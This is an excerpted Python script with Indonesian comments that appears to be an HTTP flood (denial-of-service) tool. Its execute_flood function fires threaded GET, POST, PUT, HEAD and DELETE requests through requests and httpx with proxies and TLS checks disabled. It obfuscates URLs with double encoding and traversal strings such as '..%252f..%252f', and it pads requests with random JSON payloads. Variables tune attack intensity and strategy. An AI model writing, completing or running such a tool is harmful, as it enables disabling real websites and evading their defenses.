try:
    ...
    import string
    import random
    import itertools # Diimpor tapi sepertinya tidak digunakan secara eksplisit, bisa dipertimbangkan untuk dihapus jika tidak ada rencana penggunaan
    import json
    import colorama
    import os
    import sys
    ...
    from itertools import cycle # cycle digunakan untuk spinner
    from colorama import Back, Fore, Style, init
    from time import sleep # sleep digunakan di beberapa tempat
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ModuleNotFoundError as e:
    print(f'{Fore.RED}Requires Modules {e} Not Installed. Please run: pip install requests httpx colorama urllib3')
    exit()
...
def dinamicsgui(startgui):
    ...
    time.sleep(0.2) # Sedikit lebih cepat dari sebelumnya

current_date = time.strftime("%Y-%m-%d") # Mengambil tanggal saat ini
XBanner = f"""
...
def check_url_format(url):
    check = urlparse(url)
    return bool(check.scheme and check.netloc)
...
def generate_complex_json_payload(depth=3, keys_per_level=3, string_length=20):
    if depth < 0:
        return "".join(random.choices(string.ascii_letters + string.digits, k=max(1,string_length)))
    d = {}
...
def generate_advanced_payload(payload_type="mixed_string", intensity="medium", strategy="default", max_size_kb=5):
    ...
    if payload_type == "deep_json":
        ...
        return generate_complex_json_payload(1,2,15) if "json" in payload_type else \
               {f"param_{k}":generate_mixed_string_payload(random.randint(5,20)) for k in range(random.randint(2,4))}
...
def execute_flood(target_url, method, target_details):
    ...
    obfuscated_path_segments = [selective_url_encode(seg, intensity=attack_intensity, 
                                                    full_encode_chance=0.3 if attack_intensity=="high" else 0.1,
                                                    double_encode_chance=0.2 if attack_intensity=="high" else 0.05) 
                                for seg in path_segments]
    
    if (attack_intensity == "high" or attack_strategy == "aggressive_payload") and random.random() < 0.4:
        junk_path_elements = ["uploads", "temp", ".git", "wp-admin", "..%252f..%252f", "%252e%252e%252f", 
                              "api/v1", "".join(random.choices(string.ascii_lowercase, k=random.randint(4,7)))]
    ...
    for i in range(num_base_params):
        ...
        obf_val = selective_url_encode(param_val_str, attack_intensity, 
                                       full_encode_chance=0.4 if attack_intensity=="high" else 0.15,
                                       double_encode_chance=0.3 if attack_intensity=="high" else 0.1)
    ...
    final_query_string = urlencode(query_dict, doseq=True, quote_via=lambda s,sf,e,er: s if isinstance(s, str) and '%' in s and not any(c in ' <>"{}|\\^`' for c in unquote(s)) else quote_plus(s) )
    ...
    try:
        if method in ["GET", "POST", "PUT", "JSON", "HEAD", "DELETE"]: 
            with requests.Session() as s:
                ...
                if method == "GET": r = s.get(url_to_hit, **request_kwargs)
                elif method == "POST":
                ...
                elif method == "HEAD": r = s.head(url_to_hit, **request_kwargs)
                elif method == "DELETE": r = s.delete(url_to_hit, **request_kwargs)
            ...
            with httpx.Client(http2=True, headers=req_headers, proxies=proxies_dict, timeout=10, verify=False, follow_redirects=True) as client:
                if method == "JSON_HTTPX":
                    ...
                    if body_payload_content: # If there's a body, assume POST for HTTPX method as well
                        if req_headers.get("Content-Type","").startswith("application/json"):
    ...
    except requests.exceptions.RequestException: update_stats(error_type="http_error") 
    except httpx.TimeoutException: update_stats(error_type="timeout")
    except httpx.ProxyError: update_stats(error_type="proxy")
    except httpx.ConnectError: update_stats(error_type="connection")
    except httpx.RequestError: update_stats(error_type="http_error") 
    except (socket.timeout, ssl.SSLError, ssl.SSLWantReadError, ssl.SSLWantWriteError): update_stats(error_type="timeout") 
    except socket.error: update_stats(error_type="connection")
    except Exception: update_stats(error_type="other")
...
if __name__ == "__main__":
    ...
    try:
        ...
        assert target_details["host"] # Pastikan hostname tidak None
    ...
    for i in range(threads_count):
        ...
        thread.start()
        if i > 0 and i % 50 == 0 and i < threads_count -1 : # Stagger starts for very large thread counts
            time.sleep(0.05)

    try:
        while not stop_event.is_set():
            if threads_count > 0 and not any(t.is_alive() for t in threads) and stats["sent"] < threads_count : 
                if time.time() - attack_start_time_main > 10: # Increased grace period before assuming all threads died
    ...
    time.sleep(0.1) # Ensure monitor output is flushed
    cleargui()
    print(XBanner) 
